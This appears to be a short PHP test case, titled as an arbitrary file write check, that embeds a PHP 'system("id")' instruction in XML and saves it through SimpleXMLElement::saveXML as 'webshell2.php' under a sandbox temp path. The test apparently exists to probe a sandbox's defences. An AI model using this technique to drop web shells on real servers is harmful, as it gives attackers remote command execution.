--TEST--
Arbitrary file write via SimpleXMLElement::saveXML with a path
--FILE--
<?php

$xml = "<?xml version=\"1.0\"?><r><?php system(\"id\"); ?></r>";
$x   = new SimpleXMLElement($xml);
$x->saveXML("/tmp/sbx3/webshell2.php");
return "dropped";
